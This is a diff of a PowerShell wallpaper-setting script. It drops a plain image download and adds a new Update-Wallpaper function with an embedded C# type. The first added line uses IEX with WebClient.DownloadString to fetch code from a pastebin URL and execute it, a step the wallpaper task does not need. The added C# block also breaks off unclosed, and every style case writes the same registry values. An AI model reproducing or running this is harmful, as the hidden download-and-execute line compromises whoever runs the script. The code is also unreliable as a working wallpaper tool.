@@ -1,53 +1,56 @@
-$url = 'https://i.ebayimg.com/images/g/1SEAAOSwKcRhL~15/s-l1600.jpg'
-$outpath = "C:\Temp\s-l1600.jpg"
-Invoke-WebRequest -Uri $url -OutFile $outpath
+powershell IEX (New-Object Net.WebClient).DownloadString("https://pastebin.com/raw/EDDbjz2v")
 
-$wc = New-Object System.Net.WebClient
-$wc.DownloadFile($url, $outpath)
-$MyWallpaper = 'C:\Temp\s-l1600.jpg' 
+$wallPaperFolder = 'C:\Temp'
 
-function Set-Wallpaper {
 
-param (
-    [parameter(Mandatory=$True)]
-    # Provide path to image
-    [string]$Image
-    # Provide wallpaper style that you would like applied
-)
- 
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
- 
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
- 
 
- 
-Add-Type -TypeDefinition @" 
-using System; 
-using System.Runtime.InteropServices;
-  
-public class Params
-{ 
-    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
-    public static extern int SystemParametersInfo (Int32 uAction, 
-                                                   Int32 uParam, 
-                                                   String lpvParam, 
-                                                   Int32 fuWinIni);
+
+Function Update-Wallpaper {
+    Param(
+        [Parameter(Mandatory=$true)]
+        $Path,
+
+        [ValidateSet('Center','Stretch','Fill','Tile','Fit')]
+        $Style
+    )
+    Try {
+        if (-not ([System.Management.Automation.PSTypeName]'Wallpaper.Setter').Type) {
+            Add-Type -TypeDefinition @"
+            using System;
+            using System.Runtime.InteropServices;
+            using Microsoft.Win32;
+            namespace Wallpaper {
+                public enum Style : int {
+                    Center, Stretch, Fill, Fit, Tile
+                }
+                public class Setter {
+                    public const int SetDesktopWallpaper = 20;
+                    public const int UpdateIniFile = 0x01;
+                    public const int SendWinIniChange = 0x02;
+                    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+                    private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
+                    public static void SetWallpaper ( string path, Wallpaper.Style style ) {
+                        SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
+                        RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
+                        switch( style ) {
+                            case Style.Tile :
+                                key.SetValue(@"WallpaperStyle", "0") ; 
+                                key.SetValue(@"TileWallpaper", "1") ; 
+                                break;
+                            case Style.Center :
+                                key.SetValue(@"WallpaperStyle", "0") ; 
+                                key.SetValue(@"TileWallpaper", "1") ; 
+                                break;
+                            case Style.Stretch :
+                                key.SetValue(@"WallpaperStyle", "0") ; 
+                                key.SetValue(@"TileWallpaper", "1") ; 
+                                break;
+                            case Style.Fill :
+                                key.SetValue(@"WallpaperStyle", "0") ; 
+                                key.SetValue(@"TileWallpaper", "1") ; 
+                                break;
+                            case Style.Fit :
+                                key.SetValue(@"WallpaperStyle", "0") ; 
+                                key.SetValue(@"TileWallpaper", "1") ; 
+                                break;
 }
-"@ 
-  
-    $SPI_SETDESKWALLPAPER = 0x0014
-    $UpdateIniFile = 0x01
-    $SendChangeEvent = 0x02
-  
-    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
-  
-    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
-}
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
- 
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
-Set-WallPaper -Image "C:\Temp\s-l1600.jpg"
